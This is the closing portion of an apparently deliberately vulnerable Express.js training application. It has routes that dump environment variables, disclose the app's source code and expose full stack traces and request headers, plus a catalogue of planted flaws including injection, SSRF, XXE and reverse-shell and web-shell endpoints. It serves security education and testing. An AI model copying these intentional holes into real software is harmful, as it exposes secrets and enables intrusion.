app.get('/debug', (req, res) => {
  res.json({
    env: process.env,
    cwd: process.cwd(),
    platform: process.platform,
    nodeVersion: process.version,
    memoryUsage: process.memoryUsage(),
    uptime: process.uptime(),
    pid: process.pid
  });
});

app.get('/source', (req, res) => {
  // VULN: Source code disclosure
  fs.readFile(__filename, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.type('text/plain').send(data);
  });
});

// ==========================================
// VULNERABILITY SUMMARY
// ==========================================

app.get('/vulns', (req, res) => {
  res.json({
    title: 'Vulnerable OWASP App - Vulnerability List',
    categories: {
      'A01:2021 - Broken Access Control': [
        'GET /profile/:id - IDOR',
        'POST /login - Weak authentication',
        'GET /admin - Cookie-based auth bypass'
      ],
      'A02:2021 - Cryptographic Failures': [
        'GET /encrypt - Weak encryption',
        'POST /register - Plaintext passwords',
        'GET /config - Exposed secrets'
      ],
      'A03:2021 - Injection': [
        'GET /users - SQL Injection',
        'POST /auth - SQL Injection login bypass',
        'GET /ping - Command Injection',
        'GET /dns - Command Injection',
        'GET /file - Command Injection',
        'POST /search - NoSQL Injection',
        'GET /ldap - LDAP Injection',
        'GET /xpath - XPath Injection'
      ],
      'A04:2021 - Insecure Design': [
        'POST /reset-password - Predictable tokens',
        'GET /security-questions - Weak questions',
        'POST /verify-code - No rate limiting'
      ],
      'A05:2021 - Security Misconfiguration': [
        'GET /config - Exposed configuration',
        'GET /error - Stack traces',
        'GET /files - Directory listing',
        'GET /defaults - Default credentials'
      ],
      'A06:2021 - Vulnerable Components': [
        'POST /merge - Prototype pollution',
        'POST /deserialize - Insecure deserialization',
        'GET /fetch - SSRF',
        'GET /proxy - Internal SSRF'
      ],
      'A07:2021 - Auth Failures': [
        'GET /session - Session fixation',
        'POST /brute - Brute force vulnerable',
        'POST /change-password - Weak policy'
      ],
      'A08:2021 - Integrity Failures': [
        'GET /download - Path traversal, no integrity',
        'GET /deploy - Insecure CI/CD'
      ],
      'A09:2021 - Logging Failures': [
        'POST /log - Log injection',
        'GET /debug-logs - Sensitive data in logs',
        'GET /audit - No monitoring'
      ],
      'A10:2021 - SSRF': [
        'POST /webhook - SSRF via webhook',
        'GET /pdf - SSRF via PDF generation'
      ],
      'XSS': [
        'GET /search-xss - Reflected XSS',
        'POST /comments - Stored XSS',
        'GET /comments - XSS rendering',
        'GET /dom-xss - DOM XSS'
      ],
      'File Upload': [
        'POST /upload - No validation',
        'GET /uploads/:filename - Path traversal'
      ],
      'XXE': [
        'POST /xml - XML External Entity'
      ],
      'Path Traversal': [
        'GET /read-file - Directory traversal'
      ],
      'Open Redirect': [
        'GET /redirect - Open redirect',
        'GET /login-redirect - Open redirect via next'
      ],
      'Reverse Shell': [
        'GET /shell - Reverse shell commands',
        'GET /reverse-shell - Multiple payloads',
        'POST /webshell - Web shell',
        'GET /cmd - Command execution'
      ],
      'API': [
        'PUT /users/:id - Mass assignment',
        'GET /api/v1/users - Overly permissive',
        'POST /graphql - Query injection'
      ],
      'CORS': [
        'GET /api/data - CORS misconfiguration'
      ],
      'JWT': [
        'GET /jwt - Weak JWT (alg: none)'
      ],
      'Debug': [
        'GET /debug - System info leak',
        'GET /source - Source code disclosure'
      ]
    }
  });
});

// Error handler with stack traces
app.use((err, req, res, next) => {
  // VULN: Detailed error exposure
  res.status(500).json({
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    body: req.body,
    query: req.query,
    headers: req.headers
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`⚠️  VULNERABLE APP running on port ${PORT}`);
  console.log('🔒 This application contains INTENTIONAL vulnerabilities');
  console.log('📚 For security testing and education ONLY');
});
